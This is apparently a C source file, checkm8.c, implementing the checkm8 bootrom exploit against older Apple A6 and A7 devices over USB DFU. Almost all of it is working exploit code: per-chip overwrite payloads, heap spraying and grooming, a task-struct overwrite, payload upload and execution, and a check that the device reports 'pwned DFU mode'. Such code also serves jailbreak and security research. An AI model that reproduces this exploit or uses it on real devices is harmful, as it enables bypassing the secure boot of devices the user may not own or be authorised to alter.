/*
 * checkm8.c
 * copyright (C) 2021/01/22 dora2ios
 *
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "ircv.h"
#include "checkm8.h"


// Log
static int empty(void){
    return 0;
}
#ifdef HAVE_DEBUG
#define DEBUG_(...) printf(__VA_ARGS__)
#else
#define DEBUG_(...) empty()
#endif


// usb
struct irecv_client_private {
    int debug;
    int usb_config;
    int usb_interface;
    int usb_alt_interface;
    unsigned int mode;
    struct irecv_device_info device_info;
    IOUSBDeviceInterface320 **handle;
    IOUSBInterfaceInterface300 **usbInterface;
    irecv_event_cb_t progress_callback;
    irecv_event_cb_t received_callback;
    irecv_event_cb_t connected_callback;
    irecv_event_cb_t precommand_callback;
    irecv_event_cb_t postcommand_callback;
    irecv_event_cb_t disconnected_callback;
};


unsigned char blank_buf[0x800];

static int usb_req_stall(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

static int usb_req_leak(irecv_client_t client){
    //unsigned char buf[0x40];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 1);
}

static int usb_req_leak_fast(irecv_client_t client){
    //unsigned char buf[0x40];
    irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 100000); // fast dfu
    return IRECV_E_TIMEOUT;
}

static int usb_req_no_leak(irecv_client_t client){
    //unsigned char buf[0x41];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x41, 1);
}

static int send_data(irecv_client_t client, unsigned char* data, size_t size){
    return irecv_usb_control_transfer(client, 0x21, 1, 0, 0, data, size, 100);
}


// payload
#define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
#define S5l8955X_OVERWRITE S5l8950X_OVERWRITE
#define S5l8960X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
    switch(cpid) {
        case 0x8950:
            config->large_leak = 659;
            config->overwrite_offset = 0x640;
            config->overwrite = S5l8950X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;
        case 0x8955:
            config->large_leak = 659;
            config->overwrite_offset = 0x640;
            config->overwrite = S5l8955X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;
        case 0x8960:
            config->large_leak = 7942;
            config->overwrite_offset = 0x580;
            config->overwrite = S5l8960X_OVERWRITE;
            config->overwrite_len = 0x30;
            return 0;
        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
    }
}

static int heap(irecv_client_t client, uint16_t cpid, checkm8_32_t config){
    int r;
    
    DEBUG_("heap spray\n");
    if(usb_req_stall(client) != IRECV_E_PIPE) {
        printf("ERROR: Failed to stall pipe.\n");
        irecv_close(client);
        return -1;
    }
    usleep(100);
    
    if(cpid == 0x8960){
        for(int i = 0; i < config.large_leak; i++) {
            r = usb_req_leak_fast(client);
        }
    } else {
        for(int i = 0; i < config.large_leak; i++) {
            if(usb_req_leak(client) != IRECV_E_TIMEOUT) {
                printf("ERROR: Failed to create heap hole.\n");
                irecv_close(client);
                return -1;
            }
        }
    }
    
    if(usb_req_no_leak(client) != IRECV_E_TIMEOUT) {
        printf("ERROR: Failed to create heap hole.\n");
        irecv_close(client);
        return -1;
    }
    
    return 0;
}

static int state32(irecv_client_t client, uint16_t cpid, checkm8_32_t config){
    int r;
    
    unsigned char buf[0x800] = { 'A' };
    
    int a;
    int sent;
    int newVal;
    int maxVal;
    
    a = 0; // retry
    maxVal = config.overwrite_offset;
    
    DEBUG_("Preparing for overwrite\n");
    usleep(1000);
    sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
    
    DEBUG_("sent: %x\n", sent);
    while(sent >= maxVal || sent < 0 || (sent % 0x40) != 0x0){
        a++;
        DEBUG_("retry: %d\n", a);
        usleep(1000);
        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 64, 100);
        usleep(1000);
        sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
        DEBUG_("sent: %x\n", sent);
    }
    
    newVal = config.overwrite_offset - sent;
    DEBUG_("newval: %x\n", newVal);
    
    DEBUG_("pushing forward overwrite offset\n");
    if(irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, newVal, 10) != IRECV_E_PIPE) {
        printf("ERROR: Failed to push forward overwrite offset.\n");
        irecv_close(client);
        return -1;
    }
    
    usleep(100);
    
    if(irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0) != 0) {
        printf("ERROR: Failed to send abort.\n");
        irecv_close(client);
        return -1;
    }
    
    return 0;
}

static int state64(irecv_client_t client, uint16_t cpid, checkm8_32_t config){
    int r;
    
    unsigned char buf[0x800] = { 'A' };
    
    int a;
    int sent;
    int newVal;
    int maxVal;
    
    a = 0; // retry
    maxVal = config.overwrite_offset + 0xc0;
    
    DEBUG_("Preparing for overwrite\n");
    usleep(1000);
    sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
    
    DEBUG_("sent: %x\n", sent);
    while(sent >= maxVal || sent < 0 || (sent % 0x40) != 0x0){
        a++;
        DEBUG_("retry: %d\n", a);
        usleep(1000);
        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 64, 100);
        usleep(1000);
        sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
        DEBUG_("sent: %x\n", sent);
    }
    
    newVal = config.overwrite_offset;
    
    if(sent == 0x00) newVal += 0x40;
    if(sent == 0x40) newVal += 0;
    if(sent == 0x80) newVal -= 0x40;
    if(sent >= 0xc0) newVal += (0xc0-sent);
    DEBUG_("newval: %x\n", newVal);
    
    DEBUG_("pushing forward overwrite offset\n");
    if(irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, newVal, 100) != IRECV_E_PIPE) {
        printf("ERROR: Failed to push forward overwrite offset.\n");
        irecv_close(client);
        return -1;
    }
    
    usleep(100);
    
    // heap spray
    if(heap(client, cpid, config) != 0) {
        printf("ERROR: Failed to heap spray.\n");
        irecv_close(client);
        return -1;
    }
    
    r = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
    usleep(100);
    
    // ReEnumerate
    (*client->handle)->USBDeviceReEnumerate(client->handle, 0);
    //irecv_reset(client); // Is it better to reset?
    
    return 0;
}

// exploit
int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const struct irecv_device_info *info) {
    
    int r;
    if(!info->cpid){
        printf("ERROR: Failed to get device info.\n");
        irecv_close(client);
        return -1;
    }
    uint16_t cpid = info->cpid;
    
#ifdef HAVE_DEBUG
    printf("\x1b[1m** exploiting with checkm8\x1b[39;0m\n");
#else
    printf("\x1b[1mexploiting with checkm8\x1b[39;0m\n");
#endif
    
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(pwnd_str) {
        printf("This device is already in pwned DFU mode!\n");
        irecv_close(client);
        return 0;
    }
    
    unsigned char buf[0x800] = { 'A' };
    checkm8_32_t config;
    memset(&config, '\0', sizeof(checkm8_32_t));
    
    r = get_exploit_configuration(cpid, &config);
    if(r != 0) {
        printf("ERROR: Failed to get exploit configuration.\n");
        irecv_close(client);
        return -1;
    }
    
    r = get_payload_configuration(cpid, device_info->product_type, &config);
    if(r != 0) {
        printf("ERROR: Failed to get payload configuration.\n");
        irecv_close(client);
        return -1;
    }

    if(cpid == 0x8960){
        // A7
        r = state64(client, cpid, config);
    } else {
        // A6
        if(heap(client, cpid, config) != 0) {
            printf("ERROR: Failed to heap spray.\n");
            irecv_close(client);
            return -1;
        }
        
        irecv_reset(client);
        irecv_close(client);
        client = NULL;
        usleep(100);
        irecv_open_with_ecid_and_attempts(&client, 0, 5);
        if(!client) {
            printf("ERROR: Failed to reconnect to device.\n");
            irecv_close(client);
            return -1;
        }
        
        r = state32(client, cpid, config);
    }
    
    if(r != 0) {
        printf("ERROR: Failed to set 1st stage.\n");
        irecv_close(client);
        return -1;
    }
    
    irecv_close(client);
    client = NULL;
    usleep(500000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("ERROR: Failed to reconnect to device.\n");
        return -1;
    }
    
    DEBUG_("Grooming heap\n");
    r = usb_req_stall(client);
    if(r != IRECV_E_PIPE) {
        printf("ERROR: Failed to stall pipe.\n");
        irecv_close(client);
        return -1;
    }
    usleep(100);
    r = usb_req_leak(client);
    if(r != IRECV_E_TIMEOUT) {
        printf("ERROR: Failed to create heap hole.\n");
        irecv_close(client);
        return -1;
    }
    DEBUG_("Overwriting task struct\n");
    
    r = irecv_usb_control_transfer(client, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
    if(r != IRECV_E_PIPE) {
        printf("ERROR: Failed to overwrite task.\n");
        irecv_close(client);
        return -1;
    }
    
    DEBUG_("Uploading payload\n");
    {
        size_t len = 0;
        size_t size;
        size_t sent;
        while(len < config.payload_len) {
            size = ((config.payload_len - len) > 0x800) ? 0x800 : (config.payload_len - len);
            sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&config.payload[len], size, 100);
            len += size;
        }
    }
    
    DEBUG_("Executing payload\n");
    irecv_reset(client);
    irecv_close(client);
    free(config.payload);
    client = NULL;
    usleep(500000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("ERROR: Failed to reconnect to device.\n");
        return -1;
    }
    info = irecv_get_device_info(client);
    pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        irecv_close(client);
        printf("ERROR: Device not in pwned DFU mode.\n");
        return -1;
    }
    
    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
    irecv_close(client);
    return 0;
}
